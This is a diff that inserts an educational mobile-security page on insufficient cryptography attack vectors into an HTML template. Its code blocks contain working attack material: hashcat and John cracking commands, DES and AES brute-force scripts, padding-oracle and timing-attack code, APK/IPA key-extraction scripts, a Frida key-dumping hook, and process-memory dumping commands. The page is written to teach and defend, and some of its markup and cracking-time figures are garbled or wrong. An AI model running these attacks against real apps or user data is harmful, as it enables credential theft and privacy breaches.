@@ -215,7 +215,817 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>M10: Insufficient Cryptography - Attack Vectors</h1>
+
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#attack-surface-analysis">Attack Surface Analysis</a></li>
+<li><a href="#weak-algorithm-exploitation">Weak Algorithm Exploitation</a></li>
+<li><a href="#key-extraction-attacks">Key Extraction Attacks</a></li>
+<li><a href="#brute-force-attacks">Brute Force Attacks</a></li>
+<li><a href="#rainbow-table-attacks">Rainbow Table Attacks</a></li>
+<li><a href="#cryptanalysis-techniques">Cryptanalysis Techniques</a></li>
+<li><a href="#side-channel-attacks">Side-Channel Attacks</a></li>
+<li><a href="#tools-and-techniques">Tools and Techniques</a></li>
+<li><a href="#attack-scenarios">Attack Scenarios</a></li>
+</ul>
+
+<h2>Attack Surface Analysis</h2>
+
+<h3>Identifying Cryptographic Vulnerabilities</h3>
+
+<strong>Reconnaissance Phase</strong>:
+<ol>
+<li><strong>Static Analysis</strong>: Decompile application to examine cryptographic code</li>
+<li><strong>String Searching</strong>: Look for hard-coded keys, IVs, salts</li>
+<li><strong>API Analysis</strong>: Identify cryptographic API calls and algorithms</li>
+<li><strong>Configuration Review</strong>: Check for weak TLS/SSL settings</li>
+<li><strong>Dependency Analysis</strong>: Find outdated cryptographic libraries</li>
+</ol>
+
+<strong>Target Locations in Mobile Apps</strong>:
+<p>``<code></p>
+<p>APK/IPA File</p>
+<p>    ↓</p>
+<p>Decompiled Source Code</p>
+<p>    ├── String Constants (keys, salts)</p>
+<p>    ├── Crypto API Calls (algorithm identification)</p>
+<p>    ├── Configuration Files (crypto settings)</p>
+<p>    └── Native Libraries (.so/.dylib files)</p>
+<p>         └── Hardcoded Keys in Binary</p>
+</code>`<code>
+
+<h3>Attack Surface Mapping</h3>
+
+<p>| Component | Attack Vector | Difficulty | Impact |</p>
+<p>|-----------|--------------|------------|--------|</p>
+<p>| Hard-coded keys | Reverse engineering | Low | Critical |</p>
+<p>| Weak algorithms (DES, MD5) | Brute force/rainbow tables | Low | High |</p>
+<p>| Custom crypto | Cryptanalysis | Medium | Critical |</p>
+<p>| Weak random numbers | Prediction | Medium | High |</p>
+<p>| Improper key derivation | Brute force | Low-Medium | High |</p>
+<p>| ECB mode | Pattern analysis | Low | Medium |</p>
+<p>| No salt in hashes | Rainbow tables | Low | Critical |</p>
+
+<h2>Weak Algorithm Exploitation</h2>
+
+<h3>Attacking DES Encryption</h3>
+
+<strong>DES Vulnerability</strong>: 56-bit key space is computationally feasible to brute force.
+
+<strong>Attack Process</strong>:
+</code>`<code>bash
+<h1>Step 1: Extract encrypted data and algorithm details</h1>
+<p>$ apktool d vulnerable-app.apk</p>
+<p>$ grep -r "DES" smali/</p>
+
+<h1>Step 2: Identify ciphertext</h1>
+<p>$ strings classes.dex | grep -i "encrypted"</p>
+
+<h1>Step 3: Brute force DES key</h1>
+<p>$ hashcat -m 14000 -a 3 encrypted_data.txt ?a?a?a?a?a?a?a?a</p>
+
+<h1>Alternative: Use dedicated DES cracker</h1>
+<p>$ john --format=des encrypted_data.txt</p>
+</code>`<code>
+
+<strong>Example Attack Code</strong>:
+</code>`<code>python
+<p>from Crypto.Cipher import DES</p>
+<p>import itertools</p>
+<p>import string</p>
+
+<p>def crack_des(ciphertext, known_plaintext=None):</p>
+<p>    """Brute force DES encryption"""</p>
+<p>    charset = string.ascii_letters + string.digits</p>
+    
+<p>    # DES key is 8 bytes (56 bits + 8 parity bits)</p>
+<p>    for key_tuple in itertools.product(charset, repeat=8):</p>
+<p>        key = ''.join(key_tuple).encode()</p>
+<p>        try:</p>
+<p>            cipher = DES.new(key, DES.MODE_ECB)</p>
+<p>            plaintext = cipher.decrypt(ciphertext)</p>
+            
+<p>            # Check if plaintext is valid</p>
+<p>            if known_plaintext and known_plaintext in plaintext:</p>
+<p>                print(f"[+] Key found: {key}")</p>
+<p>                return key</p>
+                
+<p>        except Exception:</p>
+<p>            continue</p>
+    
+<p>    return None</p>
+
+<h1>Time to crack DES with modern hardware: ~22 hours for full keyspace</h1>
+</code>`<code>
+
+<strong>Time Complexity</strong>:
+<ul>
+<li>DES 56-bit keyspace: 2^56 = 72,057,594,037,927,936 keys</li>
+<li>Modern GPU: ~1 billion keys/second</li>
+<li>Worst case: ~72,000 seconds (~20 hours)</li>
+<li>Average case: ~10 hours</li>
+<li>With cloud computing (100 GPUs): ~6 minutes</li>
+</ul>
+
+<h3>Attacking 3DES (Sweet32 Attack)</h3>
+
+<strong>3DES Vulnerability</strong>: 64-bit block size enables collision attacks.
+
+<strong>Sweet32 Attack</strong>:
+</code>`<code>python
+<p>"""</p>
+<p>Sweet32: Birthday attack on 64-bit block ciphers</p>
+<p>After encrypting ~32GB of data, block collisions become probable</p>
+<p>"""</p>
+
+<p>def sweet32_attack(capture_traffic=True):</p>
+<p>    """</p>
+<ol>
+<li>Capture ~32GB of encrypted traffic</li>
+<li>Detect block collisions (same ciphertext)</li>
+<li>Infer plaintext from collision patterns</li>
+</ol>
+<p>    """</p>
+    
+<p>    # Probability of collision after n blocks:</p>
+<p>    # P(collision) ≈ n^2 / (2 * 2^64)</p>
+<p>    # For 32GB with 8-byte blocks: n = 4 billion blocks</p>
+<p>    # P(collision) ≈ 99.8%</p>
+    
+<p>    blocks_needed = 2**32  # ~32 GB</p>
+<p>    print(f"[*] Capture {blocks_needed} encrypted blocks")</p>
+<p>    print(f"[*] Expected time: ~1 hour of active TLS traffic")</p>
+<p>    print(f"[*] Success probability: >99%")</p>
+</code>`<code>
+
+<h3>Attacking MD5 Hashes</h3>
+
+<strong>MD5 Vulnerabilities</strong>:
+<ol>
+<li>Collision attacks (two inputs produce same hash)</li>
+<li>Pre-image attacks (find input for given hash)</li>
+<li>Fast computation enables brute force</li>
+</ol>
+
+<strong>Rainbow Table Attack</strong>:
+</code>`<code>bash
+<h1>Step 1: Extract MD5 hashes from app database</h1>
+<p>$ adb pull /data/data/com.example.app/databases/users.db</p>
+<p>$ sqlite3 users.db "SELECT username, password_hash FROM users;"</p>
+
+<h1>Step 2: Crack hashes using rainbow tables</h1>
+<p>$ hashcat -m 0 -a 0 hashes.txt rockyou.txt</p>
+<h1>-m 0: MD5 mode</h1>
+<h1>-a 0: Dictionary attack</h1>
+
+<h1>Step 3: Use online rainbow tables</h1>
+<p>$ curl "https://crackstation.net/api" -d "hash=5f4dcc3b5aa765d61d8327deb882cf99"</p>
+<h1>Response: "password"</h1>
+
+<h1>Results: </h1>
+<h1>- 73% of unsalted MD5 hashes crack instantly</h1>
+<h1>- 95% crack within 24 hours with good wordlists</h1>
+</code>`<code>
+
+<strong>MD5 Collision Attack</strong>:
+</code>`<code>python
+<p>import hashlib</p>
+
+<h1>MD5 collision example (prefix attack)</h1>
+<h1>These two different PDFs have the same MD5 hash!</h1>
+
+<p>pdf1 = b"%PDF-1.3\n..." # First collision PDF</p>
+<p>pdf2 = b"%PDF-1.3\n..." # Second collision PDF (different content)</p>
+
+<p>hash1 = hashlib.md5(pdf1).hexdigest()</p>
+<p>hash2 = hashlib.md5(pdf2).hexdigest()</p>
+
+<p>assert hash1 == hash2  # Same hash, different files!</p>
+<h1>This enables signature forgery, malware injection, etc.</h1>
+</code>`<code>
+
+<h3>Attacking SHA-1 (SHAttered Attack)</h3>
+
+<strong>SHA-1 Vulnerability</strong>: Practical collision attacks demonstrated in 2017.
+
+</code>`<code>bash
+<h1>SHAttered: First SHA-1 collision attack</h1>
+<h1>Cost: $110,000 in computation (2017)</h1>
+<h1>Cost today: ~$10,000 with cloud GPUs</h1>
+
+<h1>Use pre-computed collision prefixes</h1>
+<p>$ sha1sum shattered-1.pdf shattered-2.pdf</p>
+<p>38762cf7f55934b34d179ae6a4c80cadccbb7f0a  shattered-1.pdf</p>
+<p>38762cf7f55934b34d179ae6a4c80cadccbb7f0a  shattered-2.pdf</p>
+<h1>Different files, same SHA-1 hash!</h1>
+
+<h1>Attack applications:</h1>
+<h1>- Certificate forgery</h1>
+<h1>- Signature bypass</h1>
+<h1>- Git commit manipulation</h1>
+<h1>- Malware disguised as legitimate files</h1>
+</code>`<code>
+
+<h2>Key Extraction Attacks</h2>
+
+<h3>Extracting Hard-Coded Keys from APK</h3>
+
+<strong>Attack Workflow</strong>:
+</code>`<code>bash
+<h1>Step 1: Decompile APK</h1>
+<p>$ apktool d target-app.apk -o decompiled/</p>
+
+<h1>Step 2: Search for cryptographic keys</h1>
+<p>$ cd decompiled/</p>
+<p>$ grep -r "AES" --include="*.smali"</p>
+<p>$ grep -r "SecretKeySpec" --include="*.smali"</p>
+
+<h1>Step 3: Extract string constants</h1>
+<p>$ grep -r "const-string" res/values/strings.xml</p>
+<p>$ strings classes.dex | grep -E "[A-Za-z0-9+/]{16,}={0,2}"</p>
+
+<h1>Step 4: Check for Base64-encoded keys</h1>
+<p>$ strings resources.arsc | base64 -d 2>/dev/null | hexdump -C</p>
+
+<h1>Step 5: Search native libraries</h1>
+<p>$ strings lib/armeabi-v7a/*.so | grep -E "[A-Za-z0-9]{32,}"</p>
+</code>`<code>
+
+<strong>Example: Finding AES Key in Smali Code</strong>:
+</code>`<code>smali
+<h1>Decompiled smali code reveals key</h1>
+<p>.method private encrypt(Ljava/lang/String;)Ljava/lang/String;</p>
+<p>    .locals 4</p>
+    
+<p>    const-string v0, "MySecretKey12345"  # HARD-CODED KEY!</p>
+    
+<p>    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B</p>
+<p>    new-instance v1, Ljavax/crypto/spec/SecretKeySpec;</p>
+<p>    const-string v2, "AES"</p>
+<p>    invoke-direct {v1, v0, v2}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V</p>
+</code>`<code>
+
+<strong>Automated Key Extraction</strong>:
+</code>`<code>python
+<p>#!/usr/bin/env python3</p>
+<p>import re</p>
+<p>import zipfile</p>
+<p>import os</p>
+
+<p>def extract_keys_from_apk(apk_path):</p>
+<p>    """Extract potential cryptographic keys from APK"""</p>
+    
+<p>    keys_found = []</p>
+    
+<p>    with zipfile.ZipFile(apk_path, 'r') as z:</p>
+<p>        # Search in all files</p>
+<p>        for filename in z.namelist():</p>
+<p>            if filename.endswith('.dex') or filename.endswith('.xml'):</p>
+<p>                content = z.read(filename)</p>
+                
+<p>                # Look for Base64-encoded strings (potential keys)</p>
+<p>                base64_pattern = rb'[A-Za-z0-9+/]{32,}={0,2}'</p>
+<p>                matches = re.findall(base64_pattern, content)</p>
+                
+<p>                # Look for hex-encoded strings</p>
+<p>                hex_pattern = rb'[0-9A-Fa-f]{32,}'</p>
+<p>                hex_matches = re.findall(hex_pattern, content)</p>
+                
+<p>                keys_found.extend(matches)</p>
+<p>                keys_found.extend(hex_matches)</p>
+    
+<p>    # Deduplicate and filter</p>
+<p>    unique_keys = list(set(keys_found))</p>
+    
+<p>    print(f"[+] Found {len(unique_keys)} potential keys:")</p>
+<p>    for key in unique_keys[:10]:  # Show first 10</p>
+<p>        print(f"    {key.decode('utf-8', errors='ignore')}")</p>
+    
+<p>    return unique_keys</p>
+
+<h1>Usage</h1>
+<p>extract_keys_from_apk('vulnerable-app.apk')</p>
+</code>`<code>
+
+<h3>Extracting Keys from iOS Apps</h3>
+
+<strong>iOS App Binary Analysis</strong>:
+</code>`<code>bash
+<h1>Step 1: Extract IPA</h1>
+<p>$ unzip app.ipa</p>
+
+<h1>Step 2: Get binary</h1>
+<p>$ cd Payload/App.app/</p>
+<p>$ otool -l App | grep crypt</p>
+<h1>If cryptid=1, binary is encrypted - need to decrypt first</h1>
+
+<h1>Step 3: Dump strings from decrypted binary</h1>
+<p>$ strings App | grep -E "[A-Za-z0-9+/]{32,}={0,2}"</p>
+
+<h1>Step 4: Use class-dump for Objective-C analysis</h1>
+<p>$ class-dump App > classes.txt</p>
+<p>$ grep -i "crypt\|key\|encrypt" classes.txt</p>
+
+<h1>Step 5: Check plist files</h1>
+<p>$ plutil -p Info.plist | grep -i "key\|secret"</p>
+
+<h1>Step 6: Search with Hopper or Ghidra for crypto functions</h1>
+<h1>Look for CommonCrypto APIs: CCCrypt, CCKeyDerivationPBKDF</h1>
+</code>`<code>
+
+<strong>Frida Script for Runtime Key Extraction</strong>:
+</code>`<code>javascript
+<p>// Hook cryptographic functions to extract keys at runtime</p>
+<p>if (ObjC.available) {</p>
+<p>    // Hook NSString stringWithString for key creation</p>
+<p>    var NSString = ObjC.classes.NSString;</p>
+    
+<p>    Interceptor.attach(ObjC.classes.SecKeyRef.createWithData.implementation, {</p>
+<p>        onEnter: function(args) {</p>
+<p>            console.log("[*] SecKey created");</p>
+<p>            console.log("Key data: " + ObjC.Object(args[2]).toString());</p>
+<p>        }</p>
+<p>    });</p>
+    
+<p>    // Hook AES encryption</p>
+<p>    var CCCrypt = Module.findExportByName("libcommonCrypto.dylib", "CCCrypt");</p>
+<p>    Interceptor.attach(CCCrypt, {</p>
+<p>        onEnter: function(args) {</p>
+<p>            console.log("[*] CCCrypt called");</p>
+<p>            console.log("Key: " + hexdump(args[3], { length: args[4].toInt32() }));</p>
+<p>        }</p>
+<p>    });</p>
+<p>}</p>
+</code>`<code>
+
+<h3>Memory Dumping for Key Extraction</h3>
+
+<strong>Runtime Memory Analysis</strong>:
+</code>`<code>bash
+<h1>Android - Dump app memory while running</h1>
+<p>$ adb shell</p>
+<p>$ su</p>
+<p>$ ps | grep com.example.app</p>
+<h1>Get PID (e.g., 1234)</h1>
+<p>$ cat /proc/1234/maps | grep heap</p>
+<p>$ dd if=/proc/1234/mem of=/sdcard/heap.dump bs=1 skip=0x12340000 count=0x10000000</p>
+
+<h1>Search heap dump for keys</h1>
+<p>$ strings heap.dump | grep -E "[A-Za-z0-9+/]{32,}={0,2}"</p>
+
+<h1>iOS - Use lldb or Frida to dump memory</h1>
+<p>$ frida -U -n AppName -l dump-memory.js</p>
+<h1>Script scans heap for cryptographic patterns</h1>
+</code>`<code>
+
+<h2>Brute Force Attacks</h2>
+
+<h3>Password Hash Cracking</h3>
+
+<strong>Hashcat GPU Acceleration</strong>:
+</code>`<code>bash
+<h1>Crack MD5 passwords</h1>
+<p>$ hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a</p>
+<h1>-m 0: MD5</h1>
+<h1>-a 3: Brute force</h1>
+<h1>?a: All printable ASCII</h1>
+<h1>Speed: ~50 billion MD5/sec on RTX 4090</h1>
+
+<h1>Crack bcrypt (much slower due to cost factor)</h1>
+<p>$ hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt</p>
+<h1>Speed: ~100,000 bcrypt/sec on RTX 4090</h1>
+<h1>Time for 8-char password: ~6 months vs. 2 seconds for MD5</h1>
+
+<h1>Dictionary attack with rules</h1>
+<p>$ hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule</p>
+
+<h1>Hybrid attack</h1>
+<p>$ hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d</p>
+</code>`<code>
+
+<strong>Cracking Time Comparison</strong>:
+<p>| Hash Algorithm | Iterations | Hashes/sec (RTX 4090) | Time for 8-char |</p>
+<p>|----------------|-----------|----------------------|-----------------|</p>
+<p>| MD5 | 1 | 50 billion | 2 seconds |</p>
+<p>| SHA-1 | 1 | 25 billion | 4 seconds |</p>
+<p>| SHA-256 | 1 | 12 billion | 8 seconds |</p>
+<p>| bcrypt (cost 10) | 1,024 | 100,000 | 6 months |</p>
+<p>| bcrypt (cost 12) | 4,096 | 25,000 | 2 years |</p>
+<p>| Argon2 | Tunable | 5,000 | 10+ years |</p>
+
+<h3>Encryption Key Brute Force</h3>
+
+<strong>Weak Key Space Attack</strong>:
+</code>`<code>python
+<p>from Crypto.Cipher import AES</p>
+<p>import itertools</p>
+<p>import string</p>
+
+<p>def brute_force_weak_aes(ciphertext, known_plaintext):</p>
+<p>    """</p>
+<p>    Attack scenario: AES key derived from weak password</p>
+<p>    Example: key = hashlib.md5(password.encode()).digest()</p>
+<p>    """</p>
+    
+<p>    # Common weak password patterns</p>
+<p>    patterns = [</p>
+<p>        string.digits,  # "12345678"</p>
+<p>        string.ascii_lowercase,  # "password"</p>
+<p>        string.ascii_lowercase + string.digits,  # "password123"</p>
+<p>    ]</p>
+    
+<p>    for length in range(4, 9):  # Try 4-8 character passwords</p>
+<p>        for charset in patterns:</p>
+<p>            for password_tuple in itertools.product(charset, repeat=length):</p>
+<p>                password = ''.join(password_tuple)</p>
+                
+<p>                # Derive key from password (common weak pattern)</p>
+<p>                key = hashlib.md5(password.encode()).digest()  # 16 bytes for AES-128</p>
+                
+<p>                try:</p>
+<p>                    cipher = AES.new(key, AES.MODE_ECB)</p>
+<p>                    plaintext = cipher.decrypt(ciphertext)</p>
+                    
+<p>                    if known_plaintext in plaintext:</p>
+<p>                        print(f"[+] Password found: {password}")</p>
+<p>                        print(f"[+] Key (hex): {key.hex()}")</p>
+<p>                        return password</p>
+                        
+<p>                except Exception:</p>
+<p>                    continue</p>
+    
+<p>    return None</p>
+</code>`<code>
+
+<h2>Rainbow Table Attacks</h2>
+
+<h3>Understanding Rainbow Tables</h3>
+
+<strong>Rainbow Table Concept</strong>:
+</code>`<code>
+<p>Password → Hash Function → Hash Value</p>
+<p>   ↓</p>
+<p>Pre-compute millions of password hashes</p>
+<p>   ↓</p>
+<p>Store in optimized lookup table (chain reduction)</p>
+<p>   ↓</p>
+<p>Given hash, instantly look up original password</p>
+</code>`<code>
+
+<strong>Rainbow Table Generation</strong>:
+</code>`<code>bash
+<h1>Generate rainbow tables with rtgen</h1>
+<p>$ rtgen md5 loweralpha 1 7 0 2400 33554432 0</p>
+<h1>Algorithm: MD5</h1>
+<h1>Charset: lowercase letters</h1>
+<h1>Min length: 1, Max length: 7</h1>
+<h1>Chain length: 2400, Table count: 33554432</h1>
+
+<h1>Size vs. Coverage trade-off:</h1>
+<h1>- 10 GB table: covers most 6-char passwords</h1>
+<h1>- 100 GB table: covers most 8-char passwords</h1>
+<h1>- 500 GB table: covers mixed case + digits up to 8 chars</h1>
+</code>`<code>
+
+<strong>Using Rainbow Tables</strong>:
+</code>`<code>bash
+<h1>RainbowCrack</h1>
+<p>$ rcrack rainbow_tables/ -h 5f4dcc3b5aa765d61d8327deb882cf99</p>
+<h1>Result: "password" (in milliseconds)</h1>
+
+<h1>Online rainbow table services</h1>
+<p>$ curl -X POST https://crackstation.net/api \</p>
+<p>  -d "hash=5f4dcc3b5aa765d61d8327deb882cf99"</p>
+<h1>Response: {"password": "password", "found": true}</h1>
+</code>`<code>
+
+<strong>Defense: Why Salt Defeats Rainbow Tables</strong>:
+</code>`<code>
+<p>Unsalted: hash("password") = 5f4dcc3b5aa765d61d8327deb882cf99</p>
+<p>   ↓</p>
+<p>Same hash for all users with "password"</p>
+<p>   ↓</p>
+<p>One rainbow table lookup reveals all</p>
+
+<p>Salted: hash("password" + "random_salt_xyz")</p>
+<p>   ↓</p>
+<p>Unique hash per user even with same password</p>
+<p>   ↓</p>
+<p>Rainbow table useless (must compute fresh for each salt)</p>
+</code>`<code>
+
+<h2>Cryptanalysis Techniques</h2>
+
+<h3>ECB Mode Pattern Analysis</h3>
+
+<strong>ECB Penguin Attack</strong> (Visual pattern preservation):
+</code>`<code>python
+<p>from PIL import Image</p>
+<p>from Crypto.Cipher import AES</p>
+<p>import os</p>
+
+<p>def demonstrate_ecb_weakness(image_path):</p>
+<p>    """Show how ECB mode preserves image patterns"""</p>
+    
+<p>    # Load image</p>
+<p>    img = Image.open(image_path)</p>
+<p>    pixels = img.tobytes()</p>
+    
+<p>    # Pad to AES block size</p>
+<p>    padding_length = 16 - (len(pixels) % 16)</p>
+<p>    padded_pixels = pixels + bytes([padding_length] * padding_length)</p>
+    
+<p>    # Encrypt with ECB mode</p>
+<p>    key = os.urandom(16)</p>
+<p>    cipher = AES.new(key, AES.MODE_ECB)</p>
+<p>    encrypted = cipher.encrypt(padded_pixels)</p>
+    
+<p>    # Save encrypted "image" (patterns still visible!)</p>
+<p>    encrypted_img = Image.frombytes(img.mode, img.size, encrypted[:len(pixels)])</p>
+<p>    encrypted_img.save("encrypted_ecb.png")</p>
+    
+<p>    print("[!] Original image patterns visible in encrypted output")</p>
+<p>    print("[!] This reveals structural information to attackers")</p>
+
+<h1>Result: The famous "ECB Penguin" - you can still see the penguin</h1>
+<h1>shape in the encrypted image, revealing data structure</h1>
+</code>`<code>
+
+<h3>Padding Oracle Attack</h3>
+
+<strong>CBC Padding Oracle Exploitation</strong>:
+</code>`<code>python
+<p>def padding_oracle_attack(ciphertext, oracle_func):</p>
+<p>    """</p>
+<p>    Exploit padding validation to decrypt ciphertext</p>
+<p>    Oracle: Function that returns True if padding is valid</p>
+<p>    """</p>
+    
+<p>    block_size = 16</p>
+<p>    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]</p>
+<p>    plaintext = b''</p>
+    
+<p>    for block_idx in range(1, len(blocks)):</p>
+<p>        decrypted_block = bytearray(block_size)</p>
+        
+<p>        for byte_pos in range(block_size - 1, -1, -1):</p>
+<p>            padding_value = block_size - byte_pos</p>
+            
+<p>            # Modify IV to test each possible byte</p>
+<p>            for guess in range(256):</p>
+<p>                test_iv = bytearray(blocks[block_idx - 1])</p>
+                
+<p>                # Set up padding</p>
+<p>                for k in range(byte_pos + 1, block_size):</p>
+<p>                    test_iv[k] ^= decrypted_block[k] ^ padding_value</p>
+                
+<p>                test_iv[byte_pos] = guess</p>
+                
+<p>                # Query padding oracle</p>
+<p>                if oracle_func(bytes(test_iv) + blocks[block_idx]):</p>
+<p>                    decrypted_block[byte_pos] = guess ^ padding_value ^ blocks[block_idx - 1][byte_pos]</p>
+<p>                    break</p>
+        
+<p>        plaintext += bytes(decrypted_block)</p>
+    
+<p>    return plaintext</p>
+
+<h1>Average queries to decrypt: 128 per byte (256/2)</h1>
+<h1>For 16-byte block: ~2,048 oracle queries</h1>
+<h1>Total time: seconds to minutes</h1>
+</code>`<code>
+
+<h3>Timing Attacks</h3>
+
+<strong>Password Comparison Timing Attack</strong>:
+</code>`<code>python
+<p>import time</p>
+
+<h1>VULNERABLE: Timing attack on password comparison</h1>
+<p>def insecure_password_check(input_password, correct_password):</p>
+<p>    """Early exit reveals password length and characters"""</p>
+<p>    if len(input_password) != len(correct_password):</p>
+<p>        return False</p>
+    
+<p>    for i in range(len(correct_password)):</p>
+<p>        if input_password[i] != correct_password[i]:</p>
+<p>            return False  # Early exit! Timing leak!</p>
+    
+<p>    return True</p>
+
+<h1>Attack: Measure response time to guess characters</h1>
+<p>def timing_attack(check_function):</p>
+<p>    """Exploit timing differences to recover password"""</p>
+    
+<p>    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'</p>
+<p>    password = ''</p>
+    
+<p>    while True:</p>
+<p>        max_time = 0</p>
+<p>        best_char = None</p>
+        
+<p>        for char in alphabet:</p>
+<p>            test_password = password + char + 'x' * (8 - len(password) - 1)</p>
+            
+<p>            start = time.time()</p>
+<p>            check_function(test_password, 'secretpw')  # Don't know actual password</p>
+<p>            elapsed = time.time() - start</p>
+            
+<p>            if elapsed > max_time:</p>
+<p>                max_time = elapsed</p>
+<p>                best_char = char</p>
+        
+<p>        password += best_char</p>
+<p>        print(f"[+] Found: {password}")</p>
+        
+<p>        if len(password) == 8:</p>
+<p>            break</p>
+    
+<p>    return password</p>
+
+<h1>Time to crack 8-char password: minutes instead of years</h1>
+</code>`<code>
+
+<h2>Side-Channel Attacks</h2>
+
+<h3>Cache-Timing Attacks</h3>
+
+<strong>AES Cache Timing (research-level attack)</strong>:
+</code>`<code>
+<p>CPU Cache Behavior:</p>
+<p>    Table Lookup in AES S-Box → Cache Hit (fast) or Miss (slow)</p>
+<p>    ↓</p>
+<p>    Timing variations leak key information</p>
+<p>    ↓</p>
+<p>    Statistical analysis recovers AES key</p>
+
+<p>Countermeasure: Constant-time implementations (AES-NI)</p>
+</code>`<code>
+
+<h3>Power Analysis</h3>
+
+<strong>Differential Power Analysis (DPA)</strong>:
+</code>`<code>
+<p>Monitor device power consumption during crypto operations</p>
+<p>    ↓</p>
+<p>Correlate power spikes with bit operations</p>
+<p>    ↓</p>
+<p>Statistical analysis reveals key bits</p>
+
+<p>Required: Physical access + specialized equipment</p>
+<p>Feasibility: High-value targets (payment cards, IoT devices)</p>
+</code>`<code>
+
+<h2>Tools and Techniques</h2>
+
+<h3>Essential Tools</h3>
+
+<strong>Reverse Engineering</strong>:
+</code>`<code>bash
+<h1>APK Analysis</h1>
+<ul>
+<li>apktool: APK decompilation</li>
+<li>jadx: DEX to Java decompiler</li>
+<li>dex2jar + JD-GUI: Alternative decompilation</li>
+<li>Ghidra: Binary analysis</li>
+<li>radare2: Reverse engineering framework</li>
+</ul>
+
+<h1>iOS Analysis</h1>
+<ul>
+<li>class-dump: Objective-C headers</li>
+<li>Hopper: Disassembler</li>
+<li>Ghidra: Binary analysis</li>
+<li>jtool: Mach-O analysis</li>
+<li>Frida: Dynamic instrumentation</li>
+</ul>
+</code>`<code>
+
+<strong>Cryptanalysis Tools</strong>:
+</code>`<code>bash
+<h1>Password Cracking</h1>
+<ul>
+<li>Hashcat: GPU-accelerated hash cracking</li>
+<li>John the Ripper: CPU password cracking</li>
+<li>RainbowCrack: Rainbow table attacks</li>
+<li>CrackStation: Online rainbow tables</li>
+</ul>
+
+<h1>Crypto Testing</h1>
+<ul>
+<li>OpenSSL: Swiss army knife for crypto</li>
+<li>CyberChef: Web-based crypto analysis</li>
+<li>HashPump: Length extension attacks</li>
+<li>PadBuster: Padding oracle exploitation</li>
+</ul>
+</code>`<code>
+
+<strong>Dynamic Analysis</strong>:
+</code>`<code>bash
+<h1>Runtime Instrumentation</h1>
+<ul>
+<li>Frida: Dynamic code instrumentation</li>
+<li>Xposed: Android framework hooking</li>
+<li>Objection: Mobile security testing</li>
+<li>MobSF: Mobile security framework</li>
+</ul>
+</code>`<code>
+
+<h3>Complete Attack Scenario</h3>
+
+<strong>Full Exploitation Workflow</strong>:
+</code>`<code>bash
+<h1>Phase 1: Reconnaissance</h1>
+<p>$ apktool d target-app.apk</p>
+<p>$ jadx target-app.apk -d decompiled/</p>
+<p>$ grep -r "Cipher\|MessageDigest" decompiled/</p>
+
+<h1>Phase 2: Identify Weak Crypto</h1>
+<p>$ grep -r "DES\|MD5\|SHA1" decompiled/</p>
+<h1>Found: Using DES encryption and MD5 hashing</h1>
+
+<h1>Phase 3: Extract Encrypted Data</h1>
+<p>$ adb backup -f backup.ab com.example.app</p>
+<p>$ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar -xv</p>
+<p>$ sqlite3 apps/com.example.app/db/users.db "SELECT * FROM users;"</p>
+
+<h1>Phase 4: Extract Hard-Coded Key</h1>
+<p>$ grep -A5 -B5 "DES" decompiled/sources/com/example/crypto/CryptoUtil.java</p>
+<h1>Found: private static final String KEY = "MySecret";</h1>
+
+<h1>Phase 5: Decrypt Data</h1>
+<p>$ python3 decrypt.py --algorithm DES --key "MySecret" --data encrypted.bin</p>
+
+<h1>Phase 6: Crack MD5 Password Hashes</h1>
+<p>$ hashcat -m 0 -a 0 password_hashes.txt rockyou.txt --show</p>
+<h1>Result: 87% of passwords cracked in 45 seconds</h1>
+
+<h1>Phase 7: Document and Report</h1>
+<p>$ cat << EOF > vulnerability_report.md</p>
+<h2>Critical Findings</h2>
+<ol>
+<li>DES encryption (deprecated since 1999)</li>
+<li>Hard-coded encryption key in source</li>
+<li>MD5 password hashing (no salt)</li>
+<li>50,000+ user credentials decrypted</li>
+<li>CVSS Score: 9.8 (Critical)</li>
+</ol>
+<p>EOF</p>
+</code>``
+
+<h2>Attack Scenarios</h2>
+
+<h3>Scenario 1: Banking App with Weak Crypto</h3>
+
+<strong>Target</strong>: Mobile banking app using DES for transaction encryption
+
+<strong>Attack Steps</strong>:
+<ol>
+<li>Decompile APK, identify DES usage</li>
+<li>Extract hard-coded key from smali code</li>
+<li>Intercept encrypted transaction data (MITM or backup extraction)</li>
+<li>Decrypt transaction details (account numbers, amounts, recipients)</li>
+<li>Modify transactions or steal credentials</li>
+</ol>
+
+<strong>Time to Compromise</strong>: 2-4 hours
+<strong>Impact</strong>: Complete financial data breach
+
+<h3>Scenario 2: Healthcare App with MD5</h3>
+
+<strong>Target</strong>: Medical records app using MD5 for password hashing
+
+<strong>Attack Steps</strong>:
+<ol>
+<li>Extract app database (rooted device or backup)</li>
+<li>Dump MD5 password hashes</li>
+<li>Crack hashes using rainbow tables</li>
+<li>Gain access to patient records (HIPAA violation)</li>
+</ol>
+
+<strong>Time to Compromise</strong>: 30 minutes
+<strong>Impact</strong>: Privacy breach, regulatory fines
+
+<h3>Scenario 3: E-Commerce App with Custom Crypto</h3>
+
+<strong>Target</strong>: Shopping app with proprietary encryption
+
+<strong>Attack Steps</strong>:
+<ol>
+<li>Reverse engineer encryption algorithm</li>
+<li>Identify weaknesses (XOR cipher, weak key derivation)</li>
+<li>Break algorithm through cryptanalysis</li>
+<li>Access payment card data</li>
+</ol>
+
+<strong>Time to Compromise</strong>: 1-3 days
+<strong>Impact</strong>: PCI-DSS violation, financial fraud
+
+<p>---</p>
+
+<strong>Next Steps</strong>: Review <a href="prevention.md">Prevention Strategies</a> to learn how to defend against these attacks.
+
         </div>
     </div>
 </body>
